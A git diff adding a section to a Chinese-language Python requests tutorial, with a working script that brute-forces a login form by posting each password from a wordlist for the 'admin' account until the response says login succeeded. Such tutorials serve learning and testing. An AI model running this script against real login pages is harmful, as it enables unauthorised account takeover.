@@ -417,13 +417,56 @@ for index,item in enumerate(sel):
     print('第 %d 張' % (index + 1), img_url,filename)
 ```
 
+## 寫一個簡單的暴力 requests lib
+
+- 簡單的登入 :
 
 
+- 懶人密碼暴力.txt
+```python
+import requests
 
+url = 'XXXXX'
+arq = open('Password/twitter-banned.txt','r').readlines()
 
+print(arq)
+```
 
+- 解碼UTF-8
+```python
+import requests
 
+url = 'XXXX'
+arq = open('Password/twitter-banned.txt','r').readlines()
 
+for line in arq:
+    password = line.strip()
+    payload = {'acc': 'admin', 'pwd': password,'sub': 'submit'}
+    r = requests.post(url, data=payload)
+    content = r.content
+    print (content.decode('UTF-8'))
+```
+
+- 完整程式碼
+
+```python
+import requests
+
+url = 'XXXXX'
+arq = open('Password/twitter-banned.txt','r').readlines()
+
+for line in arq:
+    password = line.strip()
+    payload = {'acc': 'admin', 'pwd': password,'sub': 'submit'}
+    r = requests.post(url, data=payload)
+    content = r.content
+    #print (content.decode('UTF-8'))
+    if "登入成功" in content.decode('UTF-8'):
+        print("===========[+] PASSWORD 有效:"+password+"===========")
+        break
+    else:
+        print("===========[-] PASSWORD 無效:"+password+"===========")
+```
 
 
 
@@ -495,4 +538,4 @@ All done!
 - How to Install Python 3 on CentOS 7 : https://linuxize.com/post/how-to-install-python-3-on-centos-7/
 ## Youtube : 
 - Python Requests Tutorial: Request Web Pages, Download Images, POST Data, Read JSON, and More : https://www.youtube.com/watch?v=tb8gHvYlCFs
-
+- [PYTHON] Writing a simple brute force with requests lib : https://www.youtube.com/watch?v=7b98iEujVJc
